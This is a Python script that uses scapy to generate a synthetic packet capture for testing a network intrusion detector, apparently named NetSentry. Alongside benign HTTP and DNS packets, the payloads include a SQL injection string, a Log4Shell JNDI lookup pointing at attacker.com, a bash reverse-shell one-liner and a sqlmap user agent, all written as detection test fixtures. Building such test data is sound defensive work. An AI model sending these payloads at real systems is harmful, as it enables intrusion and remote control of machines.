#!/usr/bin/env python3
"""
gen_test_pcap.py — generate a synthetic pcap for NetSentry quickstart testing.

Requires: python3-scapy  (pip install scapy)
Output:   /tmp/netsentry_test.pcap
"""

import sys

try:
    from scapy.all import (IP, TCP, Raw, wrpcap, Ether)
except ImportError:
    print("[gen_test_pcap] scapy not found — install with: pip install scapy")
    sys.exit(1)

DEST = "/tmp/netsentry_test.pcap"

packets = [
    # Normal HTTP GET
    Ether() / IP(src="10.0.0.1", dst="10.0.0.2") /
        TCP(sport=54321, dport=80, flags="PA") /
        Raw(b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n"),

    # SQL injection attempt
    Ether() / IP(src="10.0.0.3", dst="10.0.0.2") /
        TCP(sport=54322, dport=80, flags="PA") /
        Raw(b"GET /search?q=1'+union+select+1,2,3-- HTTP/1.1\r\n\r\n"),

    # Log4Shell attempt
    Ether() / IP(src="10.0.0.4", dst="10.0.0.2") /
        TCP(sport=54323, dport=80, flags="PA") /
        Raw(b"GET / HTTP/1.1\r\nX-Api-Version: ${jndi:ldap://attacker.com/a}\r\n\r\n"),

    # Reverse shell marker
    Ether() / IP(src="10.0.0.5", dst="10.0.0.2") /
        TCP(sport=54324, dport=4444, flags="PA") /
        Raw(b"bash -i >& /dev/tcp/192.168.1.1/4444 0>&1"),

    # Scanner UA
    Ether() / IP(src="10.0.0.6", dst="10.0.0.2") /
        TCP(sport=54325, dport=80, flags="PA") /
        Raw(b"GET / HTTP/1.1\r\nUser-Agent: sqlmap/1.7\r\n\r\n"),

    # Benign UDP DNS
    Ether() / IP(src="10.0.0.1", dst="8.8.8.8") /
        __import__('scapy.all', fromlist=['UDP']).UDP(sport=12345, dport=53) /
        Raw(b"\x00\x01\x00\x00"),
]

wrpcap(DEST, packets)
print(f"[gen_test_pcap] wrote {len(packets)} packets to {DEST}")
